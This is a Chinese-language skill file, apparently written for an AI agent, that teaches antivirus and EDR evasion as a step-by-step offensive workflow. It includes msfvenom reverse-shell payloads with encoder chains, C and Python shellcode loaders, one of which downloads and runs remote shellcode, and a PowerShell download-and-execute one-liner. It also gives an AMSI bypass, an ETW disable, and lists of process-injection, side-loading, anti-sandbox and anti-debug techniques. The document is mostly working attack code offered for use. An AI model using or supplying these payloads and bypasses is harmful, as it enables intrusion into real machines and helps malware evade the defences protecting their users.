---
name: evasion-techniques
description: 免杀与规避防御技术，覆盖Shellcode混淆→多语言加载器→MSFvenom编码→代码混淆→进程注入→EDR规避全流程
---

# 免杀与规避技术

## 1. MSFvenom生成与编码

```bash
# 基础生成
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f exe -o shell.exe

# 编码器链 (多层编码)
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 \
  -e x86/shikata_ga_nai -i 5 -f exe -o shell_encoded.exe

# 多编码器组合
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 \
  -e x86/shikata_ga_nai -i 3 \
  -e x86/countdown -i 3 \
  -f raw | msfvenom -a x64 --platform windows -e x64/xor -i 2 -f exe -o shell_multi.exe
```

## 2. C/C++加载器

```c
// Shellcode加载器 (Windows)
#include <windows.h>
int main() {
    // msfvenom -p windows/x64/shell_reverse_tcp -f c
    unsigned char shellcode[] = "\xfc\x48\x83...";
    
    void *exec = VirtualAlloc(0, sizeof(shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    memcpy(exec, shellcode, sizeof(shellcode));
    ((void(*)())exec)();
    return 0;
}
// 编译: x86_64-w64-mingw32-gcc loader.c -o loader.exe -static
```

## 3. PowerShell免杀

```powershell
# 编码执行
powershell -ep bypass -enc <BASE64>

# 无文件落地下载执行
powershell -c "IEX (New-Object Net.WebClient).DownloadString('http://server/payload.ps1')"

# AMSI绕过 (patch)
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# ETW绕过
Set-ItemProperty -Path HKLM:SOFTWARE\Microsoft\.NETFramework -Name ETWEnabled -Value 0
```

## 4. Python加载器

```python
import ctypes, base64, urllib.request

# 从远程加载shellcode
shellcode = urllib.request.urlopen("http://server/shell.bin").read()
buf = ctypes.create_string_buffer(shellcode, len(shellcode))
shell_func = ctypes.cast(buf, ctypes.CFUNCTYPE(None))

# Windows: VirtualAlloc → RtlMoveMemory → CreateThread
ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_void_p
ptr = ctypes.windll.kernel32.VirtualAlloc(0, len(shellcode), 0x3000, 0x40)
ctypes.windll.kernel32.RtlMoveMemory(ptr, buf, len(shellcode))
ctypes.windll.kernel32.CreateThread(0, 0, ptr, 0, 0, 0)
```

## 5. 进程注入

```
# 经典注入:
# CreateRemoteThread → 注入到explorer.exe/svchost.exe
# Process Hollowing → 挂起进程 → 替换内存 → 恢复执行
# DLL Hollowing → 替换合法DLL
# APC Injection → 注入到已有线程

# 工具:
# Cobalt Strike: execute-assembly / shinject
# Metasploit: post/windows/manage/migrate
```

## 6. EDR规避

```
# 1. 系统调用 (Syscall)
#    绕过用户态hook, 直接syscall (如SysWhispers3)

# 2. 回调函数执行
#    EnumFonts, EnumWindows, CreateTimerQueue等

# 3. 进程注入到可信进程
#    explorer.exe, svchost.exe, notepad.exe

# 4. DLL侧加载 (DLL Side-Loading)
#    寻找合法签名的exe → 放置恶意同名DLL

# 5. 代码签名
#    窃取/购买有效代码签名证书

# 6. 宏文档
#    VBA宏 → PowerShell → 内存加载
```

## 7. 检测规避技巧

```
# 反沙箱:
- 延迟执行检测: Sleep(30000)
- 检查物理内存 > 4GB
- 检查进程数 > 50
- 检查是否有用户交互 (鼠标移动)

# 反调试:
- IsDebuggerPresent()
- CheckRemoteDebuggerPresent()
- NtGlobalFlag
- TLS回调

# 字符串混淆:
- XOR/RC4加密字符串
- 栈上动态构造字符串
```

## 8. 清单

```
生成Payload:
  └─ msfvenom → shikata_ga_nai ×5 → C格式shellcode
加载方式:
  ├─ C/C++加载器 → mingw编译 → 静态链接
  ├─ PowerShell → Base64编码 → AMSI绕过 → 内存加载
  ├─ Python → ctypes → VirtualAlloc → CreateThread
  ├─ VBA宏 → WMI → PowerShell → 内存执行
  └─ HTA/JScript → ActiveX → Shell.Application
规避检测:
  ├─ Syscall直接调用 → 绕过用户态Hook
  ├─ 进程注入 → 注入到可信进程
  ├─ 延迟执行 → 沙箱检测
  └─ 字符串混淆 → 免静态特征
```

---

*参考: MSFvenom + ired.team + 实战经验整理*
